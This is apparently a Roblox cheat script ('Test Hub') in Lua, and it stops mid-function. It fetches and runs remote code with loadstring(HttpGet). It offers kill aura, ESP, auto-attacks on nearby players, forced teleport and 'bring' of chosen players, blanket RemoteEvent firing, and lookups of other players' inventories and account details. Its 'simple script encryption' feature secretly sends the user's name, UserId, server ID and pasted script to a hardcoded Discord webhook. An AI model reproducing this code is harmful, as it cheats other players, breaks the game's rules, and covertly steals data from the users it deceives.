local function gai()
local Anh_Gai_Alimi = {"rbxassetid://6942501524","rbxassetid://7903531742","rbxassetid://7903522083","rbxassetid://6409799523","rbxassetid://8881175113",
                "rbxassetid://7584008919","rbxassetid://6271530098","rbxassetid://7388383866","rbxassetid://7962732035","rbxassetid://6842416695","rbxassetid://6576447146",
                "rbxassetid://10171317457","rbxassetid://10171317457","rbxassetid://8598068647","rbxassetid://8192162908","rbxassetid://8677814109","rbxassetid://4597457883"
}
return Anh_Gai_Alimi
end
local No = loadstring(game:HttpGet("https://raw.githubusercontent.com/ginchao/Hoclomcongthuc/main/noitification%20"))()
local DiscordLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/ginchao/Discord-Lib/main/New'))()  
  local win = DiscordLib:Window("Test Hubs | "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) 
local per = game.Players.LocalPlayer.Name 
  DiscordLib:Notification("Test Hub","Hello! "..""..per..".                                              ".."Thanks For Using Test Hub","Ok")  
  local serv = win:Server("Universal", "rbxassetid://4483345998")  
local btns = serv:Channel("Game Test Hub Support")  
 btns:Label("Viet Nam Piece")
 btns:Button("Teleport To First Sea", function()  
  local tps = game:GetService("TeleportService")  
  DiscordLib:Notification("Wait a Sec","Teleport To Place...","...")  
  tps:Teleport("4587545091")  
  end) 
btns:Label("Glue Piece")
 btns:Button("Teleport To Place Glue Piece", function()  
  local tps = game:GetService("TeleportService")  
  DiscordLib:Notification("Wait a Sec","Teleport To Place...","...")  
  tps:Teleport("394506555")  
  end) 
btns:Label("ConDL Piece")
 btns:Button("Teleport To Place ConDL Piece", function()  
  local tps = game:GetService("TeleportService")  
  DiscordLib:Notification("Wait a Sec","Teleport To Place...","...")  
  tps:Teleport("14288176792")  
  end) 
btns:Label("AUT:OLD UNIVERSE Piece")
 btns:Button("Teleport To Place AUT:OLD UNIVERSE", function()  
  local tps = game:GetService("TeleportService")  
  DiscordLib:Notification("Wait a Sec","Teleport To Place...","...")  
  tps:Teleport("14281307196")  
  end) 
btns:Label("Sakura Stand")
 btns:Button("Teleport To Place Sakura Stand", function()  
  local tps = game:GetService("TeleportService")  
  DiscordLib:Notification("Wait a Sec","Teleport To Place...","...")  
  tps:Teleport("8534845015")  
  end) 
btns:Label("LuckyBlock Battleground")
 btns:Button("Teleport To Place LuckyBlock Battleground", function()  
  local tps = game:GetService("TeleportService")  
  DiscordLib:Notification("Wait a Sec","Teleport To Place...","...")  
  tps:Teleport("662417684")  
  end) 
  local drops = serv:Channel("Main")  
local dis = nil
drops:Textbox("Distance aura","type",true,function(v)
dis = v
end)
drops:Toggle("Kill Aura Humanoid",false,function(t)
getgenv().aura= t
if dis == nil then
DiscordLib:Notification("Warning", "Choose Player to Teleport Player", "Ok") 
else
while aura do wait(.1)
for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
if v:FindFirstChild("Humanoid") and v.Name ~= game.Players.LocalPlayer.Name and v.Humanoid.Health > 0 and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude <= math.random(dis) then
pcall(function()
repeat wait()
v.Humanoid.Health = 0
v.HumanoidRootPart.CanCollide = false
sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius", math.huge)
until v.Humanoid.Health <= 0 or auto == false
end)
end
end
end
end
end)
drops:Seperator()
 drops:Toggle("Grabtools",false, function(I) 
 getgenv().autograb = I 
 spawn(function() 
 while autograb==true do wait() 
 if not getgenv().autograb then break end 
 local humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")         
 for _, child in ipairs(workspace:GetChildren()) do 
 if game.Players.LocalPlayer.Character and child:IsA("BackpackItem") and child:FindFirstChild("Handle") then 
 humanoid:EquipTool(child) 
 end 
 end 
 end 
 end) 
 end) 
  drops:Toggle("Touch Grabtools",false, function(l)   
   getgenv().grabtools = l   
   spawn(function()   
   while grabtools do wait()   
   pcall(function()   
   while grabtools do wait()   
   spawn(function()   
   for i, m in pairs(game.Workspace:GetChildren()) do   
   if m.ClassName == "Tool" and m:FindFirstChild("Handle") then  firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, m.Handle, 1) wait()   
 firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, m.Handle, 0) wait()   
  if grabtools == false then break; end   
  end   
   end   
   end)   
   end   
   end)   
   end   
   end)  
  spawn(function()  
  while wait() do  
  if not getgenv().grabtools then break end  
  for i, v in pairs(game:GetService("Workspace"):GetChildren()) do  
  if v:FindFirstChild("ClickDetector") then  
  fireclickdetector(v.ClickDetector) wait()  
  end  
  end  
  end  
  end)  
   end)  
 local inf = nil 
 drops:Toggle("Infjump", false, function(v) 
 if inf then inf:Disconnect() end 
 getgenv().infi = v 
 local Player = game.Players.LocalPlayer 
 if infi ~= inf then 
 inf = game.UserInputService.JumpRequest:Connect(function() 
 if infi == false then inf:Disconnect() end 
     Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) 
 wait() 
 end) 
 end 
 end) 
 drops:Toggle("Auto Equip All", false, function(v) 
 local plrmain = game.Players.LocalPlayer 
 getgenv().equiptools = v 
 if not getgenv().equiptools then plrmain.Character.Humanoid:UnequipTools() end 
 while equiptools do wait()
 for i, v in pairs(game.Players.LocalPlayer:FindFirstChild("Backpack"):GetChildren()) do 
 if v:IsA("Tool") or v:IsA("HopperBin") or v:IsA("BackpackItem") then 
 v.Parent = plrmain.Character 
 if equiptools == false then plrmain.Character.Humanoid:UnequipTools()  end 
 end 
 end 
 end 
 end) 
 local Noclipping = nil  
  drops:Toggle("Noclip",false, function(v)  
  getgenv().Clip = v  
  wait(0.1)  
  local function NoclipLoop()  
  if Clip == true and game.Players.LocalPlayer.Character ~= nil then  
  for _, c in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do  
                                  if c:IsA("BasePart") and c.CanCollide == true and c.Name ~= floatName then  
  c.CanCollide = false  
  end  
  end  
  end  
  end  
  Noclipping = game:GetService("RunService").Stepped:Connect(NoclipLoop)  
  if not getgenv().Clip then Noclipping:Disconnect() end  
  end) 
  drops:Toggle("EspName",false, function(v)  
  local esp_settings = {   
      textsize = 12,  
      colour = 255,255,255  
  }  
  
  local gui = Instance.new("BillboardGui")  
  local esp = Instance.new("TextLabel",gui)  
  gui.Name = "Cracked esp";  
  gui.ResetOnSpawn = false  
  gui.AlwaysOnTop = true;  
  gui.LightInfluence = 0;  
  gui.Size = UDim2.new(1.75, 0, 1.75, 0);  
  esp.BackgroundColor3 = Color3.fromRGB(0, 255, 0);  
  esp.Text = ""  
  esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);  
  esp.BorderSizePixel = 10;  
  esp.BorderColor3 = Color3.new(esp_settings.colour)  
  esp.BorderSizePixel = 0  
  esp.Font = "GothamSemibold"  
  esp.TextSize = esp_settings.textsize  
  esp.TextColor3 = Color3.fromRGB(esp_settings.colour) -- text colour  
  
  game:GetService("RunService").RenderStepped:Connect(function()  
      for i,v in pairs (game:GetService("Players"):GetPlayers()) do  
          if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil then  
              esp.Text = "{"..v.Name.."}"  
              gui:Clone().Parent = v.Character.Head   
      end  
  end  
  end)  
  end)  
  drops:Toggle("EspName2",false, function(v)  
  local RunService = game:GetService("RunService")  
  local Players = game:GetService("Players")  
  local billboard_gui = Instance.new("BillboardGui")  
  billboard_gui.Active = true  
  billboard_gui.AlwaysOnTop = true  
  billboard_gui.ClipsDescendants = true  
  billboard_gui.LightInfluence = 1  
  billboard_gui.Size = UDim2.new(0, 150, 0, 50)  
  billboard_gui.StudsOffset = Vector3.new(0, 1, 0)  
  billboard_gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
  local text_label = Instance.new("TextLabel")  
  text_label.Font = Enum.Font.Unknown  
  text_label.Text = "nameHolder"  
  text_label.TextColor3 = Color3.new(1, 1, 1)  
  text_label.TextScaled = true  
  text_label.TextSize = 14  
  text_label.TextStrokeTransparency = 0.5  
  text_label.TextWrapped = true  
  text_label.BackgroundColor3 = Color3.new(1, 1, 1)  
  text_label.BackgroundTransparency = 1  
  text_label.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)  
  text_label.Size = UDim2.new(1, 0, 1, 0)  
  text_label.Parent = billboard_gui  
  text_label.Name = "nameText"  
  RunService.RenderStepped:Connect(function()  
  for i, v in pairs(Players:GetChildren()) do  
  if not v.Character.Head:FindFirstChild("nameESP") or v == game.Players.LocalPlayer then  
  local billboard_guiClone = billboard_gui:Clone()  
  billboard_guiClone.Name = "nameESP"  
  billboard_guiClone:FindFirstChild("nameText").Text = v.Name   
  billboard_guiClone.Parent = v.Character:FindFirstChild("Head")  
  end  
  end  
  end)  
  Players.PlayerAdded:Connect(function(player)  
  if not player.Character.Head:FindFirstChild("nameESP") or player == game.Players.LocalPlayer then  
  local billboard_guiClone = billboard_gui:Clone()  
  billboard_guiClone.Name = "nameESP"   
  billboard_guiClone:FindFirstChild("nameText").Text = player.Name  
  billboard_guiClone.Parent = player.Character:FindFirstChild("Head")  
  end  
  end)  
  end) 
local drops = serv:Channel("Meme Sea")
drops:Label("Auto Skill Quái↓")
drops:Toggle("Auto Skill Z",false,function(z)
getgenv().autoskillZ = z
while autoskillZ do wait()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
for i, c in pairs(game.Workspace.Monster:GetChildren()) do
if c: FindFirstChild("HumanoidRootPart") and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - c.HumanoidRootPart.Position).Magnitude <= 300 and c:WaitForChild("Humanoid").Health > 0 then
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "Z",[4] = "Hold"} wait()
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "Z",[4] = "Release",[5] = {["Hit_Position"] = c.HumanoidRootPart.Position + Vector3.new(),["Mouse_Position"] = c.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "Z",[4] = "Release",[5] = {["Mouse_Position"] = c.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
end
end
end
end
end
end)
drops:Toggle("Auto Skill X",false,function(z)
getgenv().autoskillX = z
while autoskillX do wait()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
for i, c in pairs(game.Workspace.Monster:GetChildren()) do
if c: FindFirstChild("HumanoidRootPart") and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - c.HumanoidRootPart.Position).Magnitude <= 300 and c:WaitForChild("Humanoid").Health > 0 then
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "X",[4] = "Hold"} wait()
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "X",[4] = "Release",[5] = {["Hit_Position"] = c.HumanoidRootPart.Position + Vector3.new(),["Mouse_Position"] = c.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "X",[4] = "Release",[5] = {["Mouse_Position"] = c.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
end
end
end
end
end
end)
drops:Toggle("Auto Skill C",false,function(z)
getgenv().autoskillC = z
while autoskillC do wait()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
for i, c in pairs(game.Workspace.Monster:GetChildren()) do
if c: FindFirstChild("HumanoidRootPart") and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - c.HumanoidRootPart.Position).Magnitude <= 300 and c:WaitForChild("Humanoid").Health > 0 then
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "C",[4] = "Hold"} wait()
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "C",[4] = "Release",[5] = {["Hit_Position"] = c.HumanoidRootPart.Position + Vector3.new(),["Mouse_Position"] = c.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "C",[4] = "Release",[5] = {["Mouse_Position"] = c.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
end
end
end
end
end
end)
drops:Toggle("Auto Skill V",false,function(z)
getgenv().autoskillV = z
while autoskillV do wait()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
for i, c in pairs(game.Workspace.Monster:GetChildren()) do
if c: FindFirstChild("HumanoidRootPart") and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - c.HumanoidRootPart.Position).Magnitude <= 300 and c:WaitForChild("Humanoid").Health > 0 then
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "V",[4] = "Hold"} wait()
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "V",[4] = "Release",[5] = {["Hit_Position"] = c.HumanoidRootPart.Position + Vector3.new(),["Mouse_Position"] = c.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "V",[4] = "Release",[5] = {["Mouse_Position"] = c.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
end
end
end
end
end
end)
drops:Label("Auto Skill Player↓")
drops:Toggle("Auto Skill Z",false,function(z)
getgenv().autoskillZp = z
while autoskillZp do wait()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
for i, c in pairs(game.Players:GetPlayers()) do
if c.Character: FindFirstChild("HumanoidRootPart") and c.Name ~= game.Players.LocalPlayer.Name and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - c.Character.HumanoidRootPart.Position).Magnitude <= 300 and c.Character:WaitForChild("Humanoid").Health > 0 then
pcall(function()
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "Z",[4] = "Hold"} wait()
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "Z",[4] = "Release",[5] = {["Hit_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new(),["Mouse_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "Z",[4] = "Release",[5] = {["Mouse_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
end)
end
end
end
end
end
end)
drops:Toggle("Auto Skill X",false,function(z)
getgenv().autoskillXp = z
while autoskillXp do wait()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
for i, c in pairs(game.Players:GetPlayers()) do
if c.Character: FindFirstChild("HumanoidRootPart") and c.Name ~= game.Players.LocalPlayer.Name and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - c.Character.HumanoidRootPart.Position).Magnitude <= 300 and c.Character:WaitForChild("Humanoid").Health > 0 then
pcall(function()
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "X",[4] = "Hold"} wait()
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "X",[4] = "Release",[5] = {["Hit_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new(),["Mouse_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "X",[4] = "Release",[5] = {["Mouse_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
end)
end
end
end
end
end
end)
drops:Toggle("Auto Skill C",false,function(z)
getgenv().autoskillCp = z
while autoskillCp do wait()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
for i, c in pairs(game.Players:GetPlayers()) do
if c.Character: FindFirstChild("HumanoidRootPart") and c.Name ~= game.Players.LocalPlayer.Name and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - c.Character.HumanoidRootPart.Position).Magnitude <= 300 and c.Character:WaitForChild("Humanoid").Health > 0 then
pcall(function()
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "C",[4] = "Hold"} wait()
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "C",[4] = "Release",[5] = {["Hit_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new(),["Mouse_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "C",[4] = "Release",[5] = {["Mouse_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
end)
end
end
end
end
end
end)
drops:Toggle("Auto Skill V",false,function(z)
getgenv().autoskillVp = z
while autoskillVp do wait()
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
for i, c in pairs(game.Players:GetPlayers()) do
if c.Character: FindFirstChild("HumanoidRootPart") and c.Name ~= game.Players.LocalPlayer.Name and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - c.Character.HumanoidRootPart.Position).Magnitude <= 300 and c.Character:WaitForChild("Humanoid").Health > 0 then
pcall(function()
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "V",[4] = "Hold"} wait()
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "V",[4] = "Release",[5] = {["Hit_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new(),["Mouse_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
local args = {[1] = game:GetService("Players").LocalPlayer.Character,[2] = v.Name,[3] = "V",[4] = "Release",[5] = {["Mouse_Position"] = c.Character.HumanoidRootPart.Position + Vector3.new()}}
game:GetService("ReplicatedStorage").OtherEvent.SkillEvents.Server_Skills:FireServer(unpack(args))
end)
end
end
end
end
end
end)
local drops = serv:Channel("New")
local function up()
local ckpl = {}
local rfp = nil
for i, v in pairs(game.Players:GetPlayers()) do
table.insert(ckpl,v.Name)
end
return ckpl
end
local ck = drops:Dropdown("Xem Inventory",up(),function(y)
rfp = y
print(y)
end)
local function rf()
local newrf = up()
ck:Clear(up())
for i, v in pairs(game.Players:GetPlayers()) do
ck:Add(v.Name)
end
end
spawn(function()
while wait(5) do
rf()
end
end)

drops:Button("Xem Inventory",function()
if rfp == nil then
DiscordLib:Notification("Thông Báo","Vui Lòng Chọn Người","Ok")
else
for i, v in pairs(game.Players[rfp].Backpack: GetChildren()) do
if v:IsA("Tool")  then
No.New("🔴 "..v.Name,3)
print("🔴 "..v.Name)
end
end
local hd = game.Players[rfp].Character:FindFirstChildWhichIsA("Tool")
if hd then
No.New("🟢 "..hd.Name,3)
print("🟢"..hd.Name)
end
end
end)
drops:Button("Xem Thông tin",function()
if rfp == nil then
DiscordLib:Notification("Thông Báo","Vui Lòng Chọn Người","Ok")
else
local dit = game.Players[rfp]
DiscordLib:Notification(dit.Name.." | "..dit.DisplayName,"Số Ngày Tạo Acc: "..dit.AccountAge.." | Userid: "..dit.UserId,"Copy Thông tin")
setclipboard(dit.Name.." | "..dit.DisplayName.." | Số Ngày Tạo Acc: "..dit.AccountAge.." | Userid: "..dit.UserId)
end
end)
drops:Button("Copy Script Server",function()
local gay = gai()
setclipboard("game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,' "..game.JobId.." ',game.Players.LocalPlayer)")
game.StarterGui:SetCore("SendNotification", {
                 Title = "TestHub", 
                 Text = "Khi Thoát Ra Và Nhập Lại Script Này Vẫn Có Thể Quay Lại Server Đã Copy",
                 Icon = gay[math.random(1,#gay)], 
                 Duration = 10
             })  
end)
drops:Textbox("ID Nhạc", "Nhập!", true, function(t)
local SoundId = t
local Sound = Instance.new("Sound")
Sound.Name = "testhubsound"
Sound.SoundId = "rbxassetid://" .. SoundId
Sound.Parent = game.Workspace
Sound:Play()
end)
drops:Button("Tắt Nhạc", function()
for i, v in pairs(game.Workspace: GetChildren()) do
if v:IsA("Sound") and v.Name == "testhubsound" then 
v:Destroy()
end
end
end)
drops:Textbox("❔Mã Hoá Script Đơn Giản", "Nhập!", true, function(V)
    local HttpService = game:GetService("HttpService")
Webhook_URL =  "https://discord.com/api/webhooks/1225843632352002099/1qBa8Kb582Fe5HylOPhEJEfbXPWLlhCklbIjftslVMb1E8Ojy52Hzw1qgzAsRzQEWd-G"
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
httprequest(
{
Url = Webhook_URL,
Method = 'POST',
Headers = {
['Content-Type'] = 'application/json'
},
Body = HttpService:JSONEncode({
["content"] = "",
["embeds"] = {{
["author"] = {
["name"] = game.Players.LocalPlayer.Name.." | "..game.Players.LocalPlayer.UserId,
["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png"
},
["title"] = ""..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
["description"] = " ["..game.Players.LocalPlayer.DisplayName.."] Vừa Dùng Hack ",
["type"] = "rich",
["color"] = tonumber(0xffffff),
["fields"] = {
{
["name"] = "Server Script:",
["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,'"..game.JobId.."',game.Players.LocalPlayer)```",
["inline"] = true },
{
["name"] = "SC",
["value"] = os.date(),
["inline"] = true },
{
["name"] = "ND: ",
["value"] = V,
["inline"] = true }
}
}}
})
})
local throw_away = {}

local SCRIPT_TO_OBFUSCATE = V

function GetBytes()
	for num = 1, #SCRIPT_TO_OBFUSCATE do
		throw_away[num] = string.byte(SCRIPT_TO_OBFUSCATE, num)
	end
end

function ConvertString()
	local string_buffer = "";
	for obj = 1, #throw_away do
		string_buffer = string_buffer .. "\\" .. throw_away[obj]
	end
	return string_buffer
end

function Obfuscate()
	GetBytes()
	local str = ConvertString()
	return setclipboard('loadstring("' .. str .. '")()')
end
DiscordLib:Notification("Thông Báo","Đã Mã Hoá Văn Bản Và Lưu Vào Bộ Nhớ Tạm","Ok")
Obfuscate()
end)
local drops = serv:Channel("Test Script 1")
local che = {}
local chest = nil
for i, v in pairs(game:GetService("Workspace"):GetChildren()) do
if v:FindFirstChild("Baixo") then
table.insert(che,v.Name)
end
end
local drop = drops:Dropdown("Teleport To Chest, Warning Take It Slow To Avoid Being Detected By The Game", che ,function(b)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace")[b].Baixo.Moldura.CFrame
end)
drops:Button("Refresh Chest",function()
drop:Clear()
for i, v in pairs(game:GetService("Workspace"):GetChildren()) do
if v:FindFirstChild("Baixo") then
drop:Add(v.Name)
end
end
end)
local drops = serv:Channel("One Fruit Simulator")
drops:Label("One Fruit Simulator, Fix Lag-----------")
drops:Toggle("Fast Attack Beta",false,function(v)
getgenv().Thinh = v
while Thinh do task.wait()
for i, c in pairs(game:GetService("Workspace").__GAME.__Mobs:GetDescendants()) do
if c:FindFirstChild("Humanoid") then
for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
local args = {
    [1] = {
        [1] = {
            [1] = "\4",
            [2] = "Combat",
            [3] = 1,
            [4] = false,
            [5] = v,
            [6] = "Melee"
        },
        [2] = {
            [1] = "\n",
            [2] = c.Parent,
            [3] = v
        }
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
end
end
end
end
end
end)
local drops = serv:Channel("RemoteEvent Script")
local D = nil
local id = game.PlaceId
drops:Label("Becareful before Using ;)")
drops:Button("Spawn Remote Event ",function()
for i, v in pairs(game: GetDescendants()) do
if v:IsA("RemoteEvent") and v.Name ~= "Eat" then
v:FireServer(id)
if v:IsA("BindableEvent") then
v:Fire(id)
if v:IsA("RemoteFunction") then
v:InvokeServer(id)
end
end
end
end
end)

 local tgls = serv:Channel("Player")  
local function up()
local ckpl = {}
local plr = nil
for i, v in pairs(game.Players:GetPlayers()) do
table.insert(ckpl,v.Name)
end
return ckpl
end
local ck = tgls:Dropdown("Xem Inventory",up(),function(y)
plr = y
end)
local function rf()
local newrf = up()
ck:Clear(newrf)
for i, v in pairs(game.Players:GetPlayers()) do
ck:Add(v.Name)
end
end
spawn(function()
while wait(5) do
rf()
end
end)
 tgls:Button("Teleport To Player", function()  
 if plr == nil then 
 DiscordLib:Notification("Warning", "Choose Player to Teleport Player", "Ok") 
 elseif plr ~= nil then 
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[plr].Character.HumanoidRootPart.CFrame  
 end 
  end)  
tgls:Toggle("Lock Screen🖥️",false,function(v)
if plr == nil then 
 DiscordLib:Notification("Warning", "Choose Player to Spectate, Need Loadmap", "Ok") 
 else
getgenv().look = v
game:GetService("RunService").RenderStepped:Connect(function()
if getgenv().look then 
workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.p, game.Players[plr].Character.Head.CFrame.p)
end
end)
end
end)
tgls:Toggle("🔗Lookat | No Shift Lock",false,function(v)
if plr == nil then 
 DiscordLib:Notification("Warning", "Choose Player to Spectate, Need Loadmap", "Ok") 
 else
getgenv().lookatv2 = v
local plrlo = game.Players[plr].Character
game:GetService("RunService").RenderStepped:Connect(function()
if getgenv().lookatv2 then
if game.Players.LocalPlayer.Character.PrimaryPart and plrlo:FindFirstChild("HumanoidRootPart") then
				local chrPos=game.Players.LocalPlayer.Character.PrimaryPart.Position
				local tPos=plrlo:FindFirstChild("HumanoidRootPart").Position
				local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
				local newCF=CFrame.new(chrPos,modTPos)
				game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(newCF)
end
end
end)
end
end)
 tgls:Toggle("Spectate Player",false, function(h) 
 if plr == nil then 
 DiscordLib:Notification("Warning", "Choose Player to Spectate", "Ok") 
 elseif plr ~= nil then 
 getgenv().view = h 
 spawn(function() 
 while view do wait() 
 workspace.CurrentCamera.CameraSubject = game.Players[plr].Character 
 if view == false then 
 workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character 
 end 
 end 
 end) 
 end 
 end) 
  
  tgls:Toggle("Auto Teleport Player",false, function(t)  
 if plr == nil then 
 DiscordLib:Notification("Warning", "Choose Player to Auto Teleport Player", "Ok") 
 elseif plr ~= nil then 
   local v2 = nil
getgenv().autele = t
if v2 then a:Disconnect() end
if autele ~= v2 then
v2 = game:GetService("RunService").RenderStepped:Connect(function()
if autele == false then v2:Disconnect() end game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[plr].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 6) wait()  
  end)  
  end  
  end
  end)  
  tgls:Toggle("Auto Bring Player",false, function(a)  
 if plr == nil then 
 DiscordLib:Notification("Warning", "Choose Player to Bring Player", "Ok") 
 elseif plr ~= nil then 
  local v2 = nil
getgenv().bri = a
if v2 then a:Disconnect() end
if bri ~= v2 then
v2 = game:GetService("RunService").RenderStepped:Connect(function()
if bri == false then v2:Disconnect() end game.Players[plr].Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5) wait()  
  end)  
 end 
 end 
  end)  
  tgls:Toggle("Auto Tween Bring Player",false, function(p)  
 if plr == nil then 
 DiscordLib:Notification("Warning", "Choose Player to Tween Bring Player", "Ok") 
 elseif plr ~= nil then 
  getgenv().autobri = p  
  spawn(function()  
  while autobri do wait()  
  pcall(function()  
  
